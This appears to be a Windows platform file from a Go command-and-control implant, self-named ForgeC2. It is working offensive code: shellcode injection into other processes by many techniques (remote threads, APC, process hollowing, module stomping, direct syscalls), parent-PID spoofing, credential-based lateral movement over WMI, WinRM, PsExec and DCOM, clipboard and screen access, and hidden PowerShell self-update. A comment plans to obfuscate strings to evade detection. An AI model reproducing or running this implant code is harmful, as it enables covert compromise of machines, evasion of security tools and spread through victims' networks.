//go:build windows
// +build windows

package main

import (
	"fmt"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"
)

// Windows API DLL handles - shared across all windows platform files
var (
	user32 = syscall.NewLazyDLL("user32.dll")
	gdi32  = syscall.NewLazyDLL("gdi32.dll")
	shcore = syscall.NewLazyDLL("shcore.dll")
	k32    = syscall.NewLazyDLL("kernel32.dll")
)

// Shared GDI / screenshot / screen proc declarations
var (
	procGetDC                  = user32.NewProc("GetDC")
	procReleaseDC              = user32.NewProc("ReleaseDC")
	procGetSystemMetrics       = user32.NewProc("GetSystemMetrics")
	procSetProcessDPIAware     = user32.NewProc("SetProcessDPIAware")
	procSetProcessDpiAwareness = shcore.NewProc("SetProcessDpiAwareness")
	procCreateCompatibleDC     = gdi32.NewProc("CreateCompatibleDC")
	procCreateCompatibleBitmap = gdi32.NewProc("CreateCompatibleBitmap")
	procSelectObject           = gdi32.NewProc("SelectObject")
	procBitBlt                 = gdi32.NewProc("BitBlt")
	procGetDIBits              = gdi32.NewProc("GetDIBits")
	procDeleteDC               = gdi32.NewProc("DeleteDC")
	procDeleteObject           = gdi32.NewProc("DeleteObject")
	procGetDeviceCaps          = gdi32.NewProc("GetDeviceCaps")
	procGetForegroundWindow    = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW         = user32.NewProc("GetWindowTextW")
)

// Shared process / thread / clipboard proc declarations
var (
	procOutputDebugStringW     = k32.NewProc("OutputDebugStringW")
	procCreateToolhelp32Snapshot = k32.NewProc("CreateToolhelp32Snapshot")
	procProcess32First           = k32.NewProc("Process32FirstW")
	procProcess32Next            = k32.NewProc("Process32NextW")
	procThread32First            = k32.NewProc("Thread32First")
	procThread32Next             = k32.NewProc("Thread32Next")
	procOpenThread               = k32.NewProc("OpenThread")
	procSuspendThread            = k32.NewProc("SuspendThread")
	procResumeThread             = k32.NewProc("ResumeThread")
	procCloseHandle              = k32.NewProc("CloseHandle")
	procSetFileAttributesW       = k32.NewProc("SetFileAttributesW")
	procGetThreadContext         = k32.NewProc("GetThreadContext")
	procSetThreadContext         = k32.NewProc("SetThreadContext")
	procOpenProcess              = k32.NewProc("OpenProcess")
	procTerminateProcess         = k32.NewProc("TerminateProcess")
	procOpenClipboard            = user32.NewProc("OpenClipboard")
	procCloseClipboard           = user32.NewProc("CloseClipboard")
	procGetClipboardData         = user32.NewProc("GetClipboardData")
	procSetClipboardData         = user32.NewProc("SetClipboardData")
	procEmptyClipboard           = user32.NewProc("EmptyClipboard")
	procGlobalLock               = k32.NewProc("GlobalLock")
	procGlobalUnlock             = k32.NewProc("GlobalUnlock")
	procGlobalAlloc              = k32.NewProc("GlobalAlloc")
	procGlobalFree               = k32.NewProc("GlobalFree")
)

// Process injection proc declarations
// TODO: Obfuscate these strings using XOR (strxor) to reduce string visibility in the binary
var (
	procOpenProcessEx      = k32.NewProc("OpenProcess")
	procVirtualAllocEx     = k32.NewProc("VirtualAllocEx")
	procWriteProcessMemory = k32.NewProc("WriteProcessMemory")
	procCreateRemoteThread = k32.NewProc("CreateRemoteThread")
	procVirtualFreeEx      = k32.NewProc("VirtualFreeEx")
	procVirtualProtectEx   = k32.NewProc("VirtualProtectEx")
	procQueueUserAPC       = k32.NewProc("QueueUserAPC")
	procGetModuleHandleW   = k32.NewProc("GetModuleHandleW")
)

// Constants
const (
	SM_XVIRTUALSCREEN  = 76
	SM_YVIRTUALSCREEN  = 77
	SM_CXVIRTUALSCREEN = 78
	SM_CYVIRTUALSCREEN = 79
	SM_CXSCREEN        = 0
	SM_CYSCREEN        = 1

	SRCCOPY    = 0x00CC0020
	CAPTUREBLT = 0x40000000
	BI_RGB     = 0
	DIB_RGB_COLORS = 0
	LOGPIXELSX = 88

	TH32CS_SNAPPROCESS        = 0x00000002
	TH32CS_SNAPTHREAD         = 0x00000004
	THREAD_SUSPEND_RESUME     = 0x0002
	PROCESS_TERMINATE         = 0x0001
	PROCESS_QUERY_INFORMATION = 0x0400
	MAX_PATH                  = 260
	CF_TEXT                   = 1
	GMEM_MOVEABLE             = 0x0002

	PROCESS_CREATE_THREAD  = 0x0002
	PROCESS_VM_OPERATION   = 0x0008
	PROCESS_VM_WRITE       = 0x0020
	PROCESS_VM_READ        = 0x0010
	PROCESS_ALL_ACCESS     = 0x1F0FFF
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_READWRITE         = 0x04
	PAGE_EXECUTE_READ      = 0x20
	PAGE_EXECUTE_READWRITE = 0x40
)

// Structs
type processEntry32 struct {
	dwSize              uint32
	cntUsage            uint32
	th32ProcessID       uint32
	th32DefaultHeapID   uintptr
	th32ModuleID        uint32
	cntThreads          uint32
	th32ParentProcessID uint32
	pcPriClassBase      int32
	dwFlags             uint32
	szExeFile           [MAX_PATH]uint16
}

type threadEntry32 struct {
	dwSize             uint32
	cntUsage           uint32
	th32ThreadID       uint32
	th32OwnerProcessID uint32
	tpBasePri          int32
	tpDeltaPri         int32
	dwFlags            uint32
}

type bitmapInfoHeader struct {
	biSize          uint32
	biWidth         int32
	biHeight        int32
	biPlanes        uint16
	biBitCount      uint16
	biCompression   uint32
	biSizeImage     uint32
	biXPelsPerMeter int32
	biYPelsPerMeter int32
	biClrUsed       uint32
	biClrImportant  uint32
}

type bitmapInfo struct {
	bmiHeader bitmapInfoHeader
}

type startupInfoExW struct {
	cb              uint32
	lpReserved      *uint16
	lpDesktop       *uint16
	lpTitle         *uint16
	dwX             uint32
	dwY             uint32
	dwXSize         uint32
	dwYSize         uint32
	dwXCountChars   uint32
	dwYCountChars   uint32
	dwFillAttribute uint32
	dwFlags         uint32
	wShowWindow     uint16
	cbReserved2     uint16
	lpReserved2     *byte
	hStdInput       uintptr
	hStdOutput      uintptr
	hStdError       uintptr
	attributeList   uintptr
}

type processInformation struct {
	hProcess    uintptr
	hThread     uintptr
	dwProcessID uint32
	dwThreadID  uint32
}

// allocateRX allocates RW memory in a remote process, writes data, then changes to RX.
func allocateRX(hProcess uintptr, data []byte) (uintptr, error) {
	addr, _, _ := procVirtualAllocEx.Call(
		hProcess, 0,
		uintptr(len(data)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if addr == 0 {
		return 0, fmt.Errorf("VirtualAllocEx RW failed")
	}
	var written uintptr
	ret, _, _ := procWriteProcessMemory.Call(
		hProcess, addr,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		procVirtualFreeEx.Call(hProcess, addr, 0, 0x8000)
		return 0, fmt.Errorf("WriteProcessMemory failed")
	}
	var oldProtect uint32
	ret, _, _ = procVirtualProtectEx.Call(
		hProcess, addr,
		uintptr(len(data)),
		uintptr(PAGE_EXECUTE_READ),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		procVirtualFreeEx.Call(hProcess, addr, 0, 0x8000)
		return 0, fmt.Errorf("VirtualProtectEx RX failed")
	}
	return addr, nil
}

// allocateLocalRX allocates RW memory in this process, writes data, then changes to RX.
func allocateLocalRX(data []byte) (uintptr, error) {
	addr, _, _ := procVirtualAlloc.Call(
		0,
		uintptr(len(data)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)
	if addr == 0 {
		return 0, fmt.Errorf("VirtualAlloc RW failed")
	}
	bofMemcpy(unsafe.Pointer(addr), unsafe.Pointer(&data[0]), uintptr(len(data)))
	var oldProtect uint32
	ret, _, _ := procVirtualProtect.Call(
		addr,
		uintptr(len(data)),
		uintptr(PAGE_EXECUTE_READ),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		procVirtualFree.Call(addr, 0, 0x8000)
		return 0, fmt.Errorf("VirtualProtect RX failed")
	}
	return addr, nil
}

func debugLog(msg string) {
	if Debug {
		p, _ := syscall.UTF16PtrFromString("[ForgeC2] " + msg)
		procOutputDebugStringW.Call(uintptr(unsafe.Pointer(p)))
	}
}

func applyHideWindow(cmd *exec.Cmd) {
	if cmd != nil {
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	}
}

func injectProcess(pid uint32, shellcode []byte, tech string) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}
	tech = strings.ToLower(strings.TrimSpace(tech))
	if tech == "" {
		tech = "createremotethread"
	}

	da := uint32(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
	hProc, _, _ := procOpenProcess.Call(uintptr(da), 0, uintptr(pid))
	if hProc == 0 {
		hProc, _, _ = procOpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
	}
	if hProc == 0 {
		return fmt.Errorf("OpenProcess failed for pid %d (check privs)", pid)
	}
	defer procCloseHandle.Call(hProc)

	switch tech {
	case "createremotethread", "crt", "remote":
		return doCreateRemoteThread(hProc, shellcode)
	case "apc", "queueapc":
		return doQueueUserAPC(hProc, pid, shellcode)
	case "earlybird":
		return doEarlyBird(hProc, pid, shellcode)
	case "ntcreatethreadex", "ntct", "nt":
		return doNtCreateThreadEx(hProc, shellcode)
	case "ntcreatethreadex_indirect", "ntcti", "nti":
		return doNtCreateThreadExIndirect(hProc, shellcode)
	case "threadless", "tl":
		return doThreadlessInject(hProc, pid, shellcode)
	case "syscall", "hellsgate", "direct":
		return doSyscallInject(hProc, shellcode)
	case "indirect":
		return doNtCreateThreadExIndirect(hProc, shellcode)
	case "hollow":
		return hollowProcess("rundll32.exe", shellcode)
	case "hijack":
		return hijackThread(pid, shellcode)
	case "atom":
		return atomBombingInject(pid, shellcode)
	case "txf":
		return transactedHollow(shellcode)
	case "stomp":
		return moduleStompInject(pid, shellcode)
	default:
		return doCreateRemoteThread(hProc, shellcode)
	}
}

func spawnProcess(targetExe string, shellcode []byte, technique string) string {
	if len(shellcode) == 0 {
		return "empty shellcode"
	}
	if targetExe == "" {
		targetExe = "rundll32.exe"
	}

	exePath := targetExe
	if !strings.Contains(targetExe, "\\") {
		envStr, _ := syscall.UTF16PtrFromString("%windir%\\system32\\" + targetExe)
		var buf [260]uint16
		procExpandEnvironmentStringsW.Call(
			uintptr(unsafe.Pointer(envStr)),
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(len(buf)),
		)
		exePath = syscall.UTF16ToString(buf[:])
		if exePath == "" {
			exePath = "C:\\Windows\\system32\\" + targetExe
		}
	}

	var hProc uintptr
	var hThread uintptr
	var dwPID uint32 = 0
	var pi processInformation

	if ppidSpoofEnabled {
		parentPID := findPidByName("explorer.exe")
		if parentPID != 0 {
			var err error
			hProc, hThread, dwPID, err = createProcessWithPPIDSpoof(exePath, "", parentPID)
			if err != nil {
				if Debug {
					fmt.Printf("[!] PPID spoof failed (%v), falling back to normal CreateProcess\n", err)
				}
			}
		} else if Debug {
			fmt.Println("[!] explorer.exe not found, skipping PPID spoof")
		}
	}

	if hProc == 0 {
		exePathPtr, _ := syscall.UTF16PtrFromString(exePath)

		var si startupInfoExW
		si.cb = uint32(unsafe.Sizeof(si))
		si.dwFlags = 0x00000001
		si.wShowWindow = 0

		ret, _, _ := procCreateProcessW.Call(
			uintptr(unsafe.Pointer(exePathPtr)),
			0, 0, 0, 0,
			uintptr(createSuspended),
			0, 0,
			uintptr(unsafe.Pointer(&si)),
			uintptr(unsafe.Pointer(&pi)),
		)
		if ret == 0 {
			return fmt.Sprintf("CreateProcessW failed for %s", exePath)
		}
		hProc = pi.hProcess
		hThread = pi.hThread
		dwPID = pi.dwProcessID
	}

	addr, err := allocateRX(hProc, shellcode)
	if err != nil {
		procTerminateProcess.Call(hProc, 1)
		procCloseHandle.Call(hProc)
		procCloseHandle.Call(hThread)
		return fmt.Sprintf("allocateRX failed: %v", err)
	}

	tech := strings.ToLower(strings.TrimSpace(technique))
	if tech == "" || tech == "createremotethread" || tech == "crt" || tech == "remote" {
		thread, _, _ := procCreateRemoteThread.Call(hProc, 0, 0, addr, 0, 0, 0)
		if thread == 0 {
			procVirtualFreeEx.Call(hProc, addr, uintptr(len(shellcode)), 0x8000)
			procTerminateProcess.Call(hProc, 1)
			procCloseHandle.Call(hProc)
			procCloseHandle.Call(hThread)
			return "CreateRemoteThread failed"
		}
		procCloseHandle.Call(thread)
	} else if tech == "queueuserapc" || tech == "apc" {
		ret3, _, _ := procQueueUserAPC.Call(addr, hThread, 0)
		if ret3 == 0 {
			procVirtualFreeEx.Call(hProc, addr, uintptr(len(shellcode)), 0x8000)
			procTerminateProcess.Call(hProc, 1)
			procCloseHandle.Call(hProc)
			procCloseHandle.Call(hThread)
			return "QueueUserAPC failed"
		}
	} else {
		thread, _, _ := procCreateRemoteThread.Call(hProc, 0, 0, addr, 0, 0, 0)
		if thread == 0 {
			procVirtualFreeEx.Call(hProc, addr, uintptr(len(shellcode)), 0x8000)
			procTerminateProcess.Call(hProc, 1)
			procCloseHandle.Call(hProc)
			procCloseHandle.Call(hThread)
			return "CreateRemoteThread failed"
		}
		procCloseHandle.Call(thread)
	}

	procResumeThread.Call(hThread)
	procCloseHandle.Call(hThread)
	procCloseHandle.Call(hProc)

	return fmt.Sprintf("spawned pid %d", dwPID)
}

func lateralMove(spec string) (string, error) {
	parts := strings.SplitN(spec, "|", 5)
	if len(parts) < 3 {
		return "", fmt.Errorf("format: type|target|user|pass|cmd (user/pass optional for some)")
	}
	typ := strings.ToLower(strings.TrimSpace(parts[0]))
	target := strings.TrimSpace(parts[1])
	user := ""
	pass := ""
	cmd := ""
	if len(parts) > 2 {
		user = strings.TrimSpace(parts[2])
	}
	if len(parts) > 3 {
		pass = strings.TrimSpace(parts[3])
	}
	if len(parts) > 4 {
		cmd = strings.TrimSpace(parts[4])
	}
	if cmd == "" {
		cmd = "whoami"
	}

	switch typ {
	case "wmi", "wmiexec":
		return lateralWMI(target, user, pass, cmd)
	case "winrm", "psremoting":
		return lateralWinRM(target, user, pass, cmd)
	case "psexec", "smbexec", "psexec-like":
		return lateralPsexec(target, user, pass, cmd)
	case "dcom":
		return lateralDCOM(target, user, pass, cmd)
	default:
		return lateralWMI(target, user, pass, cmd)
	}
}

func selfUpdateWindows(exe, tmpPath string) string {
	psScript := fmt.Sprintf(
		`Start-Sleep -Milliseconds 300; `+
			`Copy-Item -Path '%s' -Destination '%s' -Force; `+
			`Start-Process -FilePath '%s';`,
		tmpPath, exe, exe)

	cmd := exec.Command("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psScript)
	applyHideWindow(cmd)
	if err := cmd.Start(); err != nil {
		return "failed to start updater: " + err.Error()
	}

	return "self-update: new binary downloaded, replacing and restarting..."
}

func selfUpdateLinux(exe, tmpPath string) string {
	return ""
}

func selfUpdateDarwin(exe, tmpPath string) string {
	return ""
}
